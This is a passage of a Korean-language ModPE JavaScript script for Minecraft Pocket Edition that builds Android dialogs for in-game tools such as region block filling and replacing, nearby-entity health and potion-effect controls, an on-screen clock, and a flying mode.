Dark.showError(e);
}
}
}));
}


function inputPoint(n){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var p1x = new android.widget.EditText(ctx);
var p1y = new android.widget.EditText(ctx);
var p1z = new android.widget.EditText(ctx);
p1x.setHint("x좌표");
p1y.setHint("y좌표");
p1z.setHint("z좌표");
p1x.setInputType(number|number2);
p1y.setInputType(number|number2);
p1z.setInputType(number|number2);
var p1h = new android.widget.Button(ctx);
p1h.setText("플레이어(머리)의 좌표로 설정");
p1h.setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
p1x.setText(Math.floor(Entity.getX(ad))+"");
p1y.setText(Math.floor(Entity.getY(ad))+"");
p1z.setText(Math.floor(Entity.getZ(ad))+"");
}
});
var p1t = new android.widget.Button(ctx);
p1t.setText("터치한 곳으로 설정");
p1t.setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
xyzTarget = n;
Dark.toast("취소 버튼을 누르시고, 지점 1이 될 곳을 터치하세요.");
dialog = null;
}
});
layout.addView(p1x);
layout.addView(p1y);
layout.addView(p1z);
layout.addView(p1h);
layout.addView(p1t);
Dark.noFullScreen(p1x);
Dark.noFullScreen(p1y);
Dark.noFullScreen(p1z);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("지점 "+n+" 선택");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
we.x[n-1] = p1x.getText();
we.y[n-1] = p1y.getText();
we.z[n-1] = p1z.getText();
Dark.toast("설정되었습니다.");
}
}));
dialog.show();
}
catch(e){
clientMessaeg(e+", "+e.lineNumber);
}
}
}));
}


function setDialog(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
var loc3 = new android.widget.TextView(ctx);
var loc4 = new android.widget.EditText(ctx);
loc1.setText("블록 아이디 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("블록 아이디를 입력하세요...");
loc2.setTextColor(white);
loc2.setInputType(number);
loc3.setText("블록 데미지 : ");
loc3.setTextSize(18);
loc3.setTextColor(white);
loc4.setHint("블록 데미지를 입력하세요...");
loc4.setTextColor(white);
loc4.setInputType(number);
layout.addView(loc1);
layout.addView(loc2);
layout.addView(loc3);
layout.addView(loc4);
Dark.noFullScreen(loc2);
Dark.noFullScreen(loc4);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("블록 설정");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
var x1, x2, y1, y2, z1, z2;
x1 = Math.min(we.x[0], we.x[1]);
y1 = Math.min(we.y[0], we.y[1]);
z1 = Math.min(we.z[0], we.z[1]);
x2 = Math.max(we.x[0], we.x[1]);
y2 = Math.max(we.y[0], we.y[1]);
z2 = Math.max(we.z[0], we.z[1]);
for(var xx=x1;xx<x2+1;xx++)
for(var yy=y1;yy<y2+1;yy++)
for(var zz=z1;zz<z2+1;zz++)
setTile(xx, yy, zz, loc2.getText(), loc4.getText());
Dark.toast("설정되었습니다.");
}
}));
dialog.show();
}
catch(e){
clientMessaeg(e+", "+e.lineNumber);
}
}
}));
}


function replaceDialog(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var loc0 = new android.widget.TextView(ctx);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
var loc3 = new android.widget.TextView(ctx);
var loc4 = new android.widget.EditText(ctx);
var loc5 = new android.widget.TextView(ctx);
var loc6 = new android.widget.TextView(ctx);
var loc7 = new android.widget.EditText(ctx);
var loc8 = new android.widget.TextView(ctx);
var loc9 = new android.widget.EditText(ctx);
loc0.setText("이 블록(들)을");
loc0.setTextColor(white);
loc1.setText("블록 아이디 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("블록 아이디를 입력하세요...");
loc2.setTextColor(white);
loc2.setInputType(number);
loc3.setText("블록 데미지 : ");
loc3.setTextSize(18);
loc3.setTextColor(white);
loc4.setHint("블록 데미지를 입력하세요...");
loc4.setTextColor(white);
loc4.setInputType(number);
loc5.setText("\n이 블록(들)으로");
loc5.setTextColor(white);
loc6.setText("블록 아이디 : ");
loc6.setTextSize(18);
loc6.setTextColor(white);
loc7.setHint("블록 아이디를 입력하세요...");
loc7.setInputType(number);
loc7.setTextColor(white);
loc8.setText("블록 데미지 : ");
loc8.setTextSize(18);
loc8.setTextColor(white);
loc9.setHint("블록 데미지를 입력하세요...");
loc9.setTextColor(white);
loc9.setInputType(number);
layout.addView(loc0);
layout.addView(loc1);
layout.addView(loc2);
layout.addView(loc3);
layout.addView(loc4);
layout.addView(loc5);
layout.addView(loc6);
layout.addView(loc7);
layout.addView(loc8);
layout.addView(loc9);
Dark.noFullScreen(loc2);
Dark.noFullScreen(loc4);
Dark.noFullScreen(loc7);
Dark.noFullScreen(loc9);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("블록변경");
if(tf) dialog.setTitle("바꾸기");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
var x1, x2, y1, y2, z1, z2;
if(tf){
x1 = Math.min(w.x[0], w.x[1]);
y1 = Math.min(w.y[0], w.y[1]);
z1 = Math.min(w.z[0], w.z[1]);
x2 = Math.max(w.x[0], w.x[1]);
y2 = Math.max(w.y[0], w.y[1]);
z2 = Math.max(w.z[0], w.z[1]);
}
else{
x1 = Math.min(we.x[0], we.x[1]);
y1 = Math.min(we.y[0], we.y[1]);
z1 = Math.min(we.z[0], we.z[1]);
x2 = Math.max(we.x[0], we.x[1]);
y2 = Math.max(we.y[0], we.y[1]);
z2 = Math.max(we.z[0], we.z[1]);
}
for(var xx=x1;xx<x2+1;xx++)
for(var yy=y1;yy<y2+1;yy++)
for(var zz=z1;zz<z2+1;zz++)
if(getTile(xx, yy, zz)==loc2.getText()){
if(loc4.getText()==""){
setTile(xx, yy, zz, loc7.getText(), loc9.getText());
}
else{
if(Level.getData(xx, yy, zz)==loc4.getText()){
setTile(xx, yy, zz, loc7.getText(), loc9.getText());
}
}
}
Dark.toast("변경되었습니다.");
}
}));
dialog.show();
}
catch(e){
clientMessaeg(e+", "+e.lineNumber);
}
}
}));
}


function makeScreenShotButton(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
btnSS = new android.widget.PopupWindow();
var layout = new android.widget.RelativeLayout(ctx);
var button = new android.widget.Button(ctx);
button.setText("SS");
button.setBackgroundColor(android.graphics.Color.argb(70, 0, 0, 0));
button.setTextColor(white);
button.setOnClickListener(new android.view.View.OnClickListener({
onClick : function(v){
ScriptManager.takeScreenshot("Dark_Capture");
Dark.toast("화면이 캡쳐되었습니다.");
}
}));
setDragListener(btnSS, button, 2);
layout.addView(button);
btnSS.setContentView(layout);
btnSS.setWidth(dip2px(ctx, 50));
btnSS.setHeight(dip2px(ctx, 40));
btnSS.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(70, 0, 0, 0)));
if(Dark.read("sBtnX")=="") btnSS.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT|android.view.Gravity.TOP, 2, 180);
else btnSS.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.LEFT|android.view.Gravity.TOP, Dark.read("sBtnX"), Dark.read("sBtnY"));
}
catch(e){
Dark.showError(e);
}
}
}));
}


function makeTwoBtn(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
btnR = new android.widget.PopupWindow();
btnF = new android.widget.PopupWindow();
var layout1 = new android.widget.RelativeLayout(ctx);
var layout2 = new android.widget.RelativeLayout(ctx);
var rw = new android.widget.ToggleButton(ctx);
var zoom = new android.widget.ToggleButton(ctx);
rw.setTextOn("Run");
rw.setTextOff("Walk");
zoom.setTextOn("Zoom");
zoom.setTextOff("Zoom");
rw.setTextColor(white);
zoom.setTextColor(white);
rw.setChecked(run);
zoom.setChecked(false);
rw.setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
if(onoff){
run = true;
rt = 4;
}
else{
run = false;
rt = 0;
}
}
}));
zoom.setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
if(onoff) ModPE.setFov(15);
else ModPE.resetFov();
}
}));
setDragListener(btnR, rw, 1);
setDragListener(btnF, zoom, 1);
layout1.addView(rw);
layout2.addView(zoom);
btnR.setContentView(layout1);
btnR.setWidth(dip2px(ctx, 70));
btnR.setHeight(dip2px(ctx, 40));
btnR.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
btnF.setContentView(layout2);
btnF.setWidth(dip2px(ctx, 70));
btnF.setHeight(dip2px(ctx, 40));
btnF.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
if(Dark.read("btnDist")==""){
btnR.showAtLocation(ctx.getWindow().getDecorView(), center|android.view.Gravity.TOP, -210, 0);
btnF.showAtLocation(ctx.getWindow().getDecorView(), center|android.view.Gravity.TOP, 210, 0);
}
else{
btnR.showAtLocation(ctx.getWindow().getDecorView(), center|android.view.Gravity.TOP, -Dark.read("btnDist"), 0);
btnF.showAtLocation(ctx.getWindow().getDecorView(), center|android.view.Gravity.TOP, Dark.read("btnDist"), 0);
}
}
catch(e){
Dark.showError(e);
}
}
}));
}


function clockMoving(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var radios = new android.widget.RadioGroup(ctx);
radios.setOrientation(1);
var radio = [];
var types = ["순간이동", "순보", "플레시 점프", "비활성화"];
var ids = [1, 2, 3, 0];
for(var n in types){
radio[n] = new android.widget.RadioButton(ctx);
radio[n].setText(types[n]);
radio[n].setId(n);
radio[n].setTextColor(white);
radios.addView(radio[n]);
}
radios.setOnCheckedChangeListener(new android.widget.RadioGroup.OnCheckedChangeListener({
onCheckedChanged: function (group, checkedId){
move = ids[checkedId];
}
}));
layout.addView(radios);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setTitle("이동 방식 선택");
dialog.setView(scroll);
dialog.setNegativeButton("확인", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function buttonLocation(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(center);
var layout1 = new android.widget.LinearLayout(ctx);
layout1.setGravity(center);
layout1.setOrientation(0);
var loc1 = new android.widget.Button(ctx);
var loc2 = new android.widget.Button(ctx);
var loc3 = new android.widget.Button(ctx);
loc1.setText("↖");
loc2.setText("↑");
loc3.setText("↗");
loc1.setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
locate = 0;
Dark.toast("수정되었습니다.");
}
});
loc2.setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
locate = 2;
Dark.toast("수정되었습니다.");
}
});
loc3.setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
locate = 3;
Dark.toast("수정되었습니다.");
}
});
layout1.addView(loc1);
layout1.addView(loc2);
layout1.addView(loc3);
var layout2 = new android.widget.LinearLayout(ctx);
layout2.setGravity(center);
layout2.setOrientation(0);
var loc4 = new android.widget.Button(ctx);
var loc5 = new android.widget.Button(ctx);
var loc6 = new android.widget.Button(ctx);
loc4.setText("←");
loc5.setText("○");
loc6.setText("→");
loc4.setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
locate = 4;
Dark.toast("수정되었습니다.");
}
});
loc5.setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
locate = 5;
Dark.toast("수정되었습니다.");
}
});
loc6.setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
locate = 6;
Dark.toast("수정되었습니다.");
}
});
layout2.addView(loc4);
layout2.addView(loc5);
layout2.addView(loc6);
var layout3 = new android.widget.LinearLayout(ctx);
layout3.setGravity(center);
layout3.setOrientation(0);
var loc7 = new android.widget.Button(ctx);
var loc8 = new android.widget.Button(ctx);
var loc9 = new android.widget.Button(ctx);
loc7.setText("↙");
loc8.setText("↓ ");
loc9.setText("↘");
loc7.setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
locate = 7;
Dark.toast("수정되었습니다.");
}
});
loc8.setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
locate = 8;
Dark.toast("수정되었습니다.");
}
});
loc9.setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
locate = 9;
Dark.toast("수정되었습니다.");
}
});
layout3.addView(loc7);
layout3.addView(loc8);
layout3.addView(loc9);
layout.addView(layout1);
layout.addView(layout2);
layout.addView(layout3);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
dialog.setTitle("버튼 위치 수정");
dialog.setView(layout);
dialog.setNegativeButton("터치한 곳으로 설정", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
makeScreen();
Dark.save("locate", 10);
locate = 10;
Dark.toast("화면을 터치하여 주세요.");
}
}));
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
Dark.save("locate", locate);
if(btn!=null){
btn.dismiss();
btn = null;
}
Dark.makeButton();
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function makeCross(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
if(tf){
try{
cross = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(center);
var text = new android.widget.TextView(ctx);
text.setText("+");
text.setGravity(center);
text.setTextColor(white);
layout.addView(text);
cross.setContentView(layout);
cross.setWidth(-2);
cross.setHeight(-2);
cross.setTouchable(false);
cross.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
cross.showAtLocation(ctx.getWindow().getDecorView(), center, 0, 0);
}
catch(e){
Dark.showError(e);
}
}
else{
if(cross!=null){
cross.dismiss();
cross = null;
}
}
}
}));
}


function showClock(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run:function(){
if(tf==true){
try{
var ap, hour, min, sec;
var day = new Date();
hour = day.getHours();
min = day.getMinutes();
sec = day.getSeconds();
if(hour>12){
hour -=12;
ap = " 오후 ";
}
else{
ap = " 오전 ";
}
if(min<10) min = "0"+min;
if(sec<10) sec = "0"+sec;
clock = new android.widget.PopupWindow();
clockText = new android.widget.TextView(ctx)
clockText.setText(ap+hour+"시 "+min+"분 "+sec+"초 ");
clockText.setTextSize(15);
clockText.setTextColor(white);
clockText.setGravity(center);
clockText.setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
openAnalogClock();
}
});
setDragListener(clock, clockText, 2);
var pad = dip2px(ctx, 3);
clockText.setPadding(pad, pad, pad, pad);
clock.setContentView(clockText);
clock.setWidth(-2);
clock.setHeight(-2);
clock.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(150, 80, 80, 80)));
if(Dark.read("clockX")=="") clock.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT|android.view.Gravity.TOP, 80, 0);
else clock.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.LEFT|android.view.Gravity.TOP, Dark.read("clockX"), Dark.read("clockY"));
}
catch(e){
Dark.showError(e);
}
}
else if(tf==false){
if(clock!=null){
clock.dismiss();
clock = null;
}
}
}
}));
}



function nearEntitySet(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
menuE2 = new android.widget.PopupWindow();
var title = makeTitle("주변 엔티티 관리", menuE2);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var es = new DarkToggleButton(ctx);
es.setText("엔티티 추적");
if(searchTarget==null) es.setChecked(false);
else es.setChecked(true);
es.setOnChangedListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
if(onoff){
entitySearch();
}
else{
if(!Player.isPlayer(searchTarget)) Entity.setNameTag(searchTarget, "");
searchTarget = null;
}
}
}));
layout.addView(es.mv());
var btns = [];
var menus = ["체력 설정", "체력 감소", "삭제", "불붙이기", "포션 효과", "최대 체력 설정"];
for(var n in menus){
btns[n] = makeButton(menus[n]);
btns[n].setId(n);
btns[n].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
entMenu(v.getId());
}
});
layout.addView(btns[n]);
}
var exit = makeExit(menuE2);
if(useExitBtn!=2) layout.addView(exit);
var layout2 = new android.widget.LinearLayout(ctx);
var scroll = makeScroll(layout, layout2, menuE2);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menuE2.setContentView(layout2);
menuE2.showAtLocation(ctx.getWindow().getDecorView(), center, 0, 0);
}
catch(e){
Dark.showError(e);
}
}
}));
}


function entMenu(type){
if(type==4){
giveEffectToEntity();
}
else{
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var title, txt, txtH;
if(type==0){
title = "주변 엔티티 체력 설정";
txt = "체력";
txtH = "체력을 입력하세요";
}
if(type==1){
title = "주변 엔티티 체력 감소";
txt = "체력 감소량";
txtH = "체력 감소량을 입력하세요";
}
if(type==2){
title = "주변 엔티티 삭제";
txt = null;
}
if(type==3){
title = "주변 엔티티 불붙이기";
txt = "시간";
txtH = "불탈 시간을 입력하세요";
}
if(type==5){
title = "주변 엔티티 최대 체력 설정";
txt = "최대 체력";
txtH = "최대 체력을 입력하세요";
}
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var txt1 = new android.widget.TextView(ctx);
txt1.setText("엔티티 타입 아이디");
txt1.setTextSize(18);
txt1.setTextColor(white);
var txt2 = new android.widget.EditText(ctx);
txt2.setHint("엔티티 타입 아이디를 입력하세요(생략시 전체)...");
txt2.setTextColor(white);
txt2.setInputType(number);
var txt3 = new android.widget.TextView(ctx);
txt3.setText("범위");
txt3.setTextSize(18);
txt3.setTextColor(white);
var txt4 = new android.widget.EditText(ctx);
txt4.setHint("반경(범위)을 입력하세요...");
txt4.setTextColor(white);
txt4.setInputType(number);
var txt5 = new android.widget.TextView(ctx);
txt5.setText(txt);
txt5.setTextSize(18);
txt5.setTextColor(white);
if(txt!=null){
var txt6 = new android.widget.EditText(ctx);
txt6.setHint(txtH);
txt6.setTextColor(white);
txt6.setInputType(number|number2);
}
layout.addView(txt1);
layout.addView(txt2);
layout.addView(txt3);
layout.addView(txt4);
Dark.noFullScreen(txt2);
Dark.noFullScreen(txt4);
if(txt!=null){
layout.addView(txt5);
layout.addView(txt6);
Dark.noFullScreen(txt6);
}
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("주변 엔티티 관리");
dialog.setNegativeButton("닫기", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
var r = txt4.getText();
for each(var e in Entity.getAll()){
px = Math.abs(Entity.getX(ad)-Entity.getX(e));
py = Math.abs(Entity.getY(ad)-Entity.getY(e));
pz = Math.abs(Entity.getZ(ad)-Entity.getZ(e));
if(px<=r&&py<=r&&pz<=r&&ad!=e){
if(txt2.getText().toString()==""&&!Player.isPlayer(e)&&Entity.getEntityTypeId(e)!=83){
if(type==0) Entity.setHealth(e, txt6.getText());
if(type==1) Entity.setHealth(e, Entity.getHealth(e)-txt6.getText());
if(type==2) Entity.remove(e);
if(type==3) Entity.setFireTicks(e, txt6.getText());
if(type==5) Entity.setMaxHealth(e, txt6.getText());
Dark.toast("플레이어와 그림은 예외입니다.");
}
else if(Entity.getEntityTypeId(e)==txt2.getText()){
if(type==0) Entity.setHealth(e, txt6.getText());
if(type==1) Entity.setHealth(e, Entity.getHealth(e)-txt6.getText());
if(type==2) Entity.remove(e);
if(type==3) Entity.setFireTicks(e, txt6.getText());
if(type==5) Entity.setMaxHealth(e, txt6.getText());
}
}
}
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}
}


function giveEffectType(target, tf){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var types = ["포화", "흡수", "체력 신장", "위더", "독", "나약함", "허기", "야간투시", "실명", "투명화", "수중 호흡", "화염저항", "저항", "재생", "멀미", "점프 강화", "즉시 데미지", "즉시 회복", "힘", "피로", "성급함", "구속", "신속"];
var typeId = [];
var checks = [];
for(var n in types){
checks[n] = new android.widget.CheckBox(ctx);
checks[n].setText(types[n]);
checks[n].setId(n);
checks[n].setTextColor(white);
checks[n].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(check, onoff){
if(onoff==true){
typeId.push(check.getId());
}
else if(onoff==false){
typeId.splice(typeId.indexOf(check.getId()), 1);
}
}
}));
layout.addView(checks[n]);
}
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("포션 효과 부여 - 종류");
dialog.setNegativeButton("닫기", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
giveEffectTime(target, typeId, tf);
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function giveEffectTime(target, typeId, tf){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var type = [MobEffect.saturation, MobEffect.absorption, MobEffect.healthBoost, MobEffect.wither, MobEffect.poison, MobEffect.weakness, MobEffect.hunger, MobEffect.nightVision, MobEffect.blindness, MobEffect.invisibility, MobEffect.waterBreathing, MobEffect.fireResistance, MobEffect.damageResistance, MobEffect.regeneration, MobEffect.confusion, MobEffect.jump, MobEffect.harm, MobEffect.heal, MobEffect.damageBoost, MobEffect.digSlowdown, MobEffect.digSpeed, MobEffect.movementSlowdown, MobEffect.movementSpeed];
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var txt1 = new android.widget.TextView(ctx);
txt1.setText("지속시간(초)");
txt1.setTextSize(18);
txt1.setTextColor(white);
var txt2 = new android.widget.EditText(ctx);
txt2.setHint("지속시간을 입력하세요...");
txt2.setTextColor(white);
txt2.setInputType(number);
var txt3 = new android.widget.TextView(ctx);
txt3.setText("강도");
txt3.setTextSize(18);
txt3.setTextColor(white);
var txt4 = new android.widget.EditText(ctx);
txt4.setHint("강도를 입력하세요...");
txt4.setTextColor(white);
txt4.setInputType(number|number2);
layout.addView(txt1);
layout.addView(txt2);
layout.addView(txt3);
layout.addView(txt4);
Dark.noFullScreen(txt2);
Dark.noFullScreen(txt4);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("포션 효과 부여 - 지속시간&강도");
dialog.setNegativeButton("닫기", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
if(tf){
for(var n in typeId){
for each(var pp in target)
Entity.addEffect(pp, type[typeId[n]], 20*Number(txt2.getText()), Number(txt4.getText())-1, true, false);
}
Dark.toast("포션 효과를 부여하였습니다.");
}
else{
for(var n in typeId){
Entity.addEffect(target, type[typeId[n]], 20*Number(txt2.getText()), Number(txt4.getText())-1, true, false);
}
Dark.toast(Player.getName(target)+"에게 포션 효과를 부여하였습니다.");
if(pca) darkMessage(Player.getName(target)+"에게 포션 효과를 부여하였습니다.", true);
}
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function removeEffectType(target){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var types = ["포화", "흡수", "체력 신장", "위더", "독", "나약함", "허기", "야간투시", "실명", "투명화", "수중 호흡", "화염저항", "저항", "재생", "멀미", "점프 강화", "즉시 데미지", "즉시 회복", "힘", "피로", "성급함", "구속", "신속"];
var effectIds = [MobEffect.saturation, MobEffect.absorption, MobEffect.healthBoost, MobEffect.wither, MobEffect.poison, MobEffect.weakness, MobEffect.hunger, MobEffect.nightVision, MobEffect.blindness, MobEffect.invisibility, MobEffect.waterBreathing, MobEffect.fireResistance, MobEffect.damageResistance, MobEffect.regeneration, MobEffect.confusion, MobEffect.jump, MobEffect.harm, MobEffect.heal, MobEffect.damageBoost, MobEffect.digSlowdown, MobEffect.digSpeed, MobEffect.movementSlowdown, MobEffect.movementSpeed];
var typeId = [];
var checks = [];
for(var n in types){
checks[n] = new android.widget.CheckBox(ctx);
checks[n].setText(types[n]);
checks[n].setId(n);
checks[n].setTextColor(white);
checks[n].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(check, onoff){
if(onoff==true){
typeId.push(check.getId());
}
else if(onoff==false){
typeId.splice(typeId.indexOf(check.getId()), 1);
}
}
}));
layout.addView(checks[n]);
}
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("포션 효과 삭제");
dialog.setNegativeButton("닫기", null);
dialog.setNeutralButton("모두 삭제", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
if(target==null){
Entity.removeAllEffects(playerTarget);
Dark.toast(Player.getName(playerTarget)+"의 포션 효과가 삭제되었습니다.");
if(pca) darkMessage(Player.getName(playerTarget)+"의 포션 효과가 삭제되었습니다.", true);
}
else{
for(var n=0;n<target.length;n++)
Entity.removeAllEffects(target[n]);
Dark.toast("포션 효과가 삭제되었습니다.");
}
}
}));
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
if(target==null){
for(var n=0;n<typeId.length;n++)
Entity.removeEffect(playerTarget, effectIds[typeId[n]]);
Dark.toast(Player.getName(playerTarget)+"의 포션 효과가 삭제되었습니다.");
if(pca) darkMessage(Player.getName(playerTarget)+"의 포션 효과가 삭제되었습니다.", true);
}
else{
for(var n=0;n<target.length;n++)
for(var m=0;m<typeId.length;m++)
Entity.removeEffect(target[n], effectIds[typeId[m]]);
Dark.toast("포션 효과가 삭제되었습니다.");
}
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function openFlying(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
menuJ = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var btns = [];
var txts = ["S", "F", "f/b"];
for(var n in txts){
btns[n] = makeButton(txts[n]);
btns[n].setId(n);
btns[n].setOnClickListener(new android.view.View.OnClickListener({
onClick : function(v){
switch(v.getId()){
case 0 : 
if(j.m==1){
j.m = 0;
Dark.toast("Staying Mode off");
}
else{
j.m = 1;
Dark.toast("Staying Mode on");
}
break;
case 1 : 
if(j.m==2){
j.m = 0;
Dark.toast("Flying Mode off");
}
else{
j.m = 2;
Dark.toast("Flying Mode on");
}
break;
case 2 : 
if(j.f==0){
j.f = 1;
Dark.toast("Back Mode");
}
else if(j.f==1){
j.f = 0;
Dark.toast("Fornt Mode");
}
break;
}
}
}));
layout.addView(btns[n]);
}
if(side==0) setDragListener(menuJ, hfly, 5);
else if(side==1) setDragListener(menuJ, hfly, 3);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
menuJ.setContentView(scroll);
menuJ.setWidth(dip2px(ctx, 50));
menuJ.setHeight(ctx.getWindowManager().getDefaultDisplay().getHeight()/2);
menuJ.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
if(side==0)
menuJ.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT|center, 0, 0);
if(side==1)
menuJ.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.LEFT|center, 0, 0);
}
catch(e){
Dark.showError(e);
}
}
}));
}


function openWeb(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var menu = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var layout2 = new android.widget.LinearLayout(ctx);
layout2.setOrientation(1);
var web = new android.webkit.WebView(ctx);
var webSet = web.getSettings();
webSet.setJavaScriptEnabled(wvsa[1]);
